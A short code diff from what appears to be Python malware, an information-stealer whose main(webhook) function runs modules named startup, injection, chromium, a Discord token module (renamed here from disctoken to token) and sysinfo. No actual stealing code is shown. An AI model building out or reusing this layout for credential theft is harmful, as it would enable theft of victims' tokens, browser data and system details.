@@ -13,7 +13,7 @@ def main(webhook: str) -> None:
         startup,
         injection,
         chromium,
-        disctoken,
+        token,
         sysinfo,
     ]
 
